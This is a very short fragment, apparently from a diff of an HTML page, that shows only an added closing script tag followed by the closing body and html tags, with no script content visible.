+</script>
 
 </body>
 </html>
